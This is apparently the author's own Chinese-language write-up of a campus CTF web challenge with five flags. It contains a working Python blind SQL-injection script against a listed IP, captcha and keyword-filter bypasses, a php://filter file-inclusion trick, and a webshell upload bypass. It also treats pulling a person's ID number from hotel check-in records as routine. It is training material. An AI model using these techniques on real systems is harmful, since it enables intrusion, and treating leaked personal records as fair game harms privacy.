### 0x00 Flag A

一个用来签到的flag，隐藏在console的log中，伪造好referer和UA进入题目页面之后就可以查看一下浏览器的console，在里面你会发现1000行随机字符串，根据提示可知，flag每两个字符之间都有一个随机字符作为阻隔，那我们就可以构造正则表达式来进行筛选（自己构造不出来可以来找我要参考的正则表达式，我构造了一个7个字符组成的正则表达式就可以实现），在chrome浏览器的console中进行正则筛选，在筛掉1003条无关字符串之后，我们就看到了这个隐藏了flag的字符串

 ![](https://bucket.shaoqunliu.cn/image/0245.png) 
或者使用burpsuite的Repeater中的正则筛选，因为需要不断伪造各种数据，所以最终测试的时候整个题我都是在burpsuite环境下做的

 ![](https://bucket.shaoqunliu.cn/image/0246.png)

### 0x01 Flag B 

拿到这个flag就得先登录系统了，首先可以观察一下登录页面发现有验证码，这个验证码是使用php当场生成的，验证码字符都是随机数产生的，所以你根本不可能在其中发现规律，在一般的ctf中，只要碰到验证码无非就是那么几种思路，要么就是在cookie里面有验证码或加密过的验证码，这个可以用burp suite进行抓包然后多次提交看看能不能绕过验证码，当然我设计的这个是不行的，因为我把验证码放在session里面了，session存储在服务器端，而且输入错误之后就会清空session，所以不行，这个验证码是后期为了防止你们使用sqlmap加入的，但是发现给自己构造脚本实现注入增加了困难，所以在验证码里面强加了一个很脑残的bug，就是在生成验证码时，用echo命令把验证码打出来了，如图：

![](https://bucket.shaoqunliu.cn/image/0247.png)

那么这个echo命令把验证码打到哪里去了呢，通过常识可以知道在生成验证码图片的时候，类型是Content-type:image/png，png图片类型，所以最后的echo会把验证码打到图片里面，然后在浏览器中拖取一张验证码图片，然后用UE打开，就可以发现在图片末尾的最后6个字符即为验证码，如图所示，然后在构造python注入脚本的时候就可以读取文件末尾的最后6个字符来判断出验证码的值来

![](https://bucket.shaoqunliu.cn/image/0248.png)

这样验证码的问题就解决了，下面主要就是来说说这个注入，这个注入过滤掉了一些字符，而且是检测到黑名单中的词php就会exit，然后我们可以fuzz一下看看都是哪些关键词被屏蔽掉了，当然作为出题人的我，就不用了fuzz了，直接贴出被屏蔽掉的关键词代码：

```
$filter = "/ |\*|#|,|union|like|sleep|ascii|regexp|for|and|or|file|--|\||`|&|".urldecode('%09')."|".urldecode("%0a")."|".urldecode("%0b")."|".urldecode('%0c')."|".urldecode('%0d')."/i";

strrpos($inp, urldecode("%00"))
```

这是一个正则表达式，可以看到在末尾有一个/i表名了在进行正则匹配的时候忽略大小写，第二行的strrpos是作为注入判断条件之一的，这也是为什么不能在url截断来注入的原因，好了，现在我们已经知道都是哪些关键字被屏蔽掉了，如果union没被屏蔽掉的话，这个题可以构造union查询来进行注入，但是union就是被我屏蔽了，而且空格也被屏蔽了，这个时候有可能就会想到我之前在SDUT-CTF出的一个无空格注入的题可以通过注释符/**/来代替空格，但是遗憾的是*也被屏蔽了，在这里就需要使用()来绕过被屏蔽的空格，我们可用的SQL关键字就只剩下了select from以及一些mysql函数，在这里基于sleep函数时间的注入也是不行的，因为sleep也被屏蔽了，所以我们就只能进行布尔盲注，我说布尔盲注你可能觉得逗号被屏蔽掉了，mid函数substr函数都需要两个以上的参数就没法注入了，其实这里有一个小技巧就是用from for来绕过，比如下面的两个语句是等效的:

![](https://bucket.shaoqunliu.cn/image/0249.png)

但是要注意的是for被屏蔽掉了，那我们就不写for，反正第三个参数也是可选的，好了，基础的原理就明确了，先来猜解一下数据库中密码字段的长度，通过多次构造表达式
 -1'=(select(1)from(login)where(length(pwd)=40))=' 中length的等值可以得出密码字段的长度为40，说明一下啊，可以通过<和>进行二分，通过二分的结果来迅速判断所在区间最终确定长度值，或者提前了解一些常见的hash算法所产生的序列长度，直接试这些给定的序列长度可快速确定，根据常识可知，40为SHA-1算法产生hash值的长度，这样我们就猜解出了密码字段的长度和存储数据库中密码的hash算法，加上之前说过的绕过验证码的方法，编制脚本配合mid函数就可以实现注入！！！我写了一个示例的python注入脚本，基于2.7.12版本的python(amd64)，使用urllib2包，如果你实在构造不出来的话，可以来找我要参考一下 （注：在这里有一个坑，就是在你构造的注入脚本里面，http头中一定不要忘了去伪造referer和UA，要不然就是一直失败的）

脚本注入过程截图：

![](https://bucket.shaoqunliu.cn/image/0250.png)

注入的过程你可以去喝杯咖啡唱个歌，看看数字逻辑(15周周一就考试了OMG)复习一下，然后经历了一段时间的等待(我写的脚本跑了15分钟左右吧)，我们获得了最终的结果

![](https://bucket.shaoqunliu.cn/image/0251.png)

一共提交640个数据包获取到最终的密码哈希，然后找到一家在线彩虹表网站这么一解密，我们就获得了admin用户的密码，然后使用这个密码就可以愉快地登录了 ![](https://bucket.shaoqunliu.cn/image/0252.png)
 然后我们就看到了内部的系统，继续渗透

 ![](https://bucket.shaoqunliu.cn/image/0253.png)

首先view一下source可以看到这个js，含有字段FLAGB_IN_HERE
 ![](https://bucket.shaoqunliu.cn/image/0254.png)

然后我们打开一看
 ![](https://bucket.shaoqunliu.cn/image/0255.png)

发现注释里面有好多鬼，然后我们把这些鬼复制下来，打开VSC，然后ctrl+/可以一键去除注释(本身注释符就是我ctrl+/一键加上的)，然后把这些东西先解brainfuck然后再解Ook!就可以得到flag了

至此得到Flag B

TL;DR

```python
# 注入脚本
import urllib2

header = {
    'Referer': 'http://www.sdutislab.cn',
    'User-agent': 'SDUT-CTF-Browser',
    'Cookie': 'PHPSESSID=amflps06jgtpbc3kjmn359r424'
}


def getCaptcha(url):
    req = urllib2.Request(url, headers=header)
    res = urllib2.urlopen(req)
    str = res.read()
    length = len(str)
    return str[length - 6: length]


sha1char = '1234567890abcdef'
urlcaptcha = "http://104.128.238.41:8000/pene/system/captcha.php"
urllogin = "http://104.128.238.41:8000/pene/system/login.php"
pwd = ''
num = 0

for length in range(0, 40):
    for i in sha1char:
        payload = '''?usrname=-1'=(select(1)from(login)where(mid((pwd)from(%d))='%s%s'))='&passwd=1&vcode=%s''' % (
            40 - length, i, pwd, getCaptcha(urlcaptcha))
        posturl = urllogin + payload
        req = urllib2.Request(posturl, headers=header)
        html = urllib2.urlopen(req).read()
        num += 1
        if "Password error" in html:
            pwd = i + pwd
            print 40 - length, pwd
        elif "Captcha error" in html:
            print "Captcha error"
print num
```

### 0x02 Flag C

Flag C还是注入，反馈系统中的那个根据用户名查询留言内容的框也是可以注入的，这个注入是带回显的，Flag C在当前数据库的另一个表flaginhere表里面，当然你作为渗透者，你要自己先想办法获取这个表名，这个也是带防注入的，绕过相对简单，可以通过随机化大小写和/**/代替空格来绕过注入，如果你不想手注的话，也可以使用sqlmap，使用sqlmap要配合space2comment.py（space2hash.py和space2mysqldash.py应该也可以）和randomcase.py这两个tamper，我测试这个题是手注的，然后就是获取表名和数据库名
构造语句得到数据库名

![](https://bucket.shaoqunliu.cn/image/0256.png)

重复构造以下语句中Limit的限制项，可以得到所有表名：

![](https://bucket.shaoqunliu.cn/image/0257.png)

构造以下语句获取字段名

![](https://bucket.shaoqunliu.cn/image/0258.png)

上面的语句我说明一点就是information_schema数据库，information这个单词包含一个or，然后or是被屏蔽掉的，所以要大写or的O，好了，我们所需要的信息就已经搜集完了，然后构造联合查询就可以得到flag了

### 0x03 Flag D

Flag D是PHP的一个文件包含漏洞，这需要考究你做渗透测试的第一个步骤就是侦查和信息收集的能力，点击右下角那个渗透测试说明的那一个超链接，然后可以观察一下这个download.php?file=ZG93bmxvYWQvYWJvdXQudHh0，明显的可以进行文件包含嘛，然后base64解码一下参数file可以得到download/about.txt，说明这个文件是在download目录下的about.txt，然后我们就来侦查一下download目录还有什么文件可以让我们下载，通过工具扫描可以得出结果
![](https://bucket.shaoqunliu.cn/image/0259.png)

然后我们就可以在download.php下构造php filter流然后base64编码之后发过去，然后把网页回显的代码base64解码就可以得到提示信息，然后将获取到的信息base64解码之后可以得到以下提示

![](https://bucket.shaoqunliu.cn/image/0260.png)

然后下载提示中的png文件，然后可以使用binwalk对这个文件成分进行分析，分析的结果如下：

![img](https://bucket.shaoqunliu.cn/image/0261.png)

我们可以在其中发现一个zip文件尾（箭头所指），但是没有zip文件头，显然文件头被移除掉了，用UE打开文件可以搜到504B0102，但是搜不到504B0304，那我们可以通过检索PNG文件尾49454E44来大体确定连接位置，然后根据常识可知zip文件头中在504B0304后面紧跟的信息是解压缩的pkware版本（一般是1400），然后就是全局方式位标记（一般是0000）和压缩方式（0800）等信息了（我在括号里注明的是常见的值，如果使用了比较老的压缩软件win98之类的那种可能就不是了，但是现在的压缩软件产生的这些信息基本上就是固定的了），在49454E44后面找到第一个1400然后截取1400之后的所有信息，如图：

![](https://bucket.shaoqunliu.cn/image/0262.png)

选择另存为之后添加文件头，然后打开可以发现是加密的，其实这个地方是伪加密，将加密位改为0000之后打开解压缩可得一个word文档，里面却看不到flag，这个其实是用了word的隐藏文字功能，在word选项里面选择显示隐藏文字，可以看到flag，如图
![](https://bucket.shaoqunliu.cn/image/0263.png)

至此得到Flag D

### 0x04 Flag E

这个是最后一个flag了，需要上传一句话木马，然后用菜刀连接，然后翻一下目录就可以看到你想要的flag，但是在上传的过程中是做了过滤的，过滤的引擎是我使用php实现出来的，实现的原理是使用file_get_contents函数读入上传的临时文件，然后检索文件中是否含有黑名单中的关键字，如果有就报错禁止上传，一共有4个关键字被限制了，分别是php,PHP,eval,assert，除了限制了这4个一句话关键字，我还加了点佐料就是移除了_GET和_POST，这也就是为什么上传了不带关键字的一句话用菜刀仍然连不上的原因，在这里可以通过构造套娃来绕过移除_GET和_POST，然后就是想办法过那个上传限制了，首先可以先上传一个png文件观察一下，到最后发现保存进去的文件名并不是取决于你的，而是一个16进制数.png的形式，这个16进制数的文件名实质上是你的PHPSESSIONID混合了你上传的时间，然后计算SHA-1得到的，这样无论你去构造什么样的文件名来绕过上传的后缀限制，最终得到的都是一个特定的png文件，这样是没法用菜刀进行连接的，所以就得想点别的办法是吧，正好上一个flag为这个题做了提示，就是这个网站还有文件包含漏洞可以利用，在这里就是利用文件包含来突出PNG中隐藏的恶意代码，然后使用菜刀相连，首先上传一个可以绕过之前所说的过滤器的一句话木马，然后将这个木马以png的形式上传到服务器得到上传路径，base64之后作为路径传入菜刀，如图：

![](https://bucket.shaoqunliu.cn/image/0264.png)

还有就是一定不要忘记去伪造HTTP头信息，配置如图：

![](https://bucket.shaoqunliu.cn/image/0265.png)

然后我们就可以在system目录里面发现最终flag这个文件了，打开一看，是一个社工的题目：

![img](https://bucket.shaoqunliu.cn/image/0266.png)

然后通过渠道我们查询到了某酒店的开房记录然后依照题目所给条件从中提取到了他的身份证号信息，然后按照要求将其MD5取前8位组成flag提交，至此得到Flag E

最后，拉一下渠道这个词，渠道这个词是360的安全工程师们发明的，当他们在做一些活动，需要获取某个邮箱或者QQ号的密码，他们就在WooYun drops里面一句话通过渠道获得某个邮箱的密码为什么什么什么，为啥呢，因为走的一些渠道都是不合法的，所以。。。还有，我个人并不懂什么是渠道，也不知道有哪些渠道，有关渠道的事别来问我，我啥也不知道